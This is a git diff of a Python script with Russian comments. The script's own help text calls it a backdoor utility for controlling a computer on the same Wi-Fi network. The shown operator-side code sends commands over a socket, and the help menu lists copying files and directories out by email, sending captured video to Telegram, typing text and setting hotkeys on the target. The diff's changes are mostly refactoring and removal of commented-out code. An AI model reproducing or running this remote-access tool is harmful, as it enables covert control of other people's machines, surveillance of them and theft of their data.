@@ -1,9 +1,8 @@
 # Добавляем необходимые подклассы - MIME-типы
-
 import subprocess
-
+import os.path
+import easyocr
 import socket, cv2
-
 import stat
 import os, time
 
@@ -94,19 +93,18 @@ def CompareHash(hash1, hash2):
 
 def read_file(command):
     client.send((command.encode("cp866")))
-#send_email(dest_email, file)
 
 def hlp():
-    print("""
-    // ─ ├ │ └ //
+    print(r"""
+    // ─ ├ │ └ \\
     //├───────────────────────────────────────────────────│
     //│util for backdoor to the computer by ip in one wifi│
     //├───────────────────────────────────────────────────│
-    // ─ ├ │ └ //
+    // ─ ├ │ └ \\
     cd [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
     ch_dir [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
     cp_dir [-D] - COPY DIRECTORY TO THE EMAIL: -D - DIRECTORY
-    cpy [-F] - COPY FILE TO THE EMAIL: -F - FILE
+    cpy [-F] - COPY FILE TO THE EMAIL (AUDIO, TEXT, VIDEO): -F - FILE
     hlp - SHOW THIS WINDOW
     send_video [-T] - SEND VIDEO TO THE TELEGRAM: -T - TIME (IN SECONDS)
     edit [-F] - EDIT TEXT FILE IN NOTEPAD: -F - FILE
@@ -125,7 +123,7 @@ def hlp():
         1. writeing [-T] - WRITEING TEXT TO THE COMP: -T - TEXT
         2. hotk [-K] [-T] - ADD HOTKEY TO WRITE TEXT: -K - KEY, -T - TEXT
     """)
-    return None
+
 
 def dub_edit():
     or_co1 = ""
@@ -138,10 +136,6 @@ def dub_edit():
     return or_co
 
 def rasp_scr(name_image):
-    import os.path
-    import cv2
-    import easyocr
-    #import matplotlib.pyplot as plt
     im_1_path = os.path.abspath(name_image)
 
     def recognize_text(img_path):
@@ -160,10 +154,6 @@ def rasp_scr(name_image):
 
 
 def rasp_scr1(name_image, string):
-    import os.path
-    import cv2
-    import easyocr
-    #import matplotlib.pyplot as plt
     im_1_path = os.path.abspath(name_image)
 
     def recognize_text(img_path):
@@ -177,27 +167,13 @@ def rasp_scr1(name_image, string):
             if string in txt:
                 print("Here")
                 break
-            """i1 += 1  
-            if i[1] == "Войти":
-                n = i1 - 5
-                break"""
         return txt
     result = recognize_text(im_1_path)
 #rasp_scr("test.png")
 
 def edit(command):
     client.send(command.encode("cp65001"))
-    r"""
-    or_co = read_file(file)
-    while or_co != "abberation":
-        or_co += input("Input a code by a line>> ")
-    client.send(("edit\n" + or_co).encode("cp65001"))
-    """
 
-'''from keyboard import add_hotkey, write, record, press_and_release
-l_t = []
-t = 0
-add_hotkey('right', lambda: write(l_t[-t]))'''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 local_ip = str(socket.gethostbyname(socket.gethostname()))
 print(local_ip)
@@ -211,12 +187,6 @@ client.send(local_ip.encode("cp65001"))
 while True:
     try:
         command = input(cur_dir + ">> ")
-        '''recorded = record(until='esc')
-        if "up" in recorded:
-            press_and_release("esc")
-            t += 1
-            l_t.append(recorded[-1])
-            recorded = []'''
         if "send_video" in command:
             client.send((command.encode("cp65001")))
             time.sleep(int(command.split(" ")[-1]))
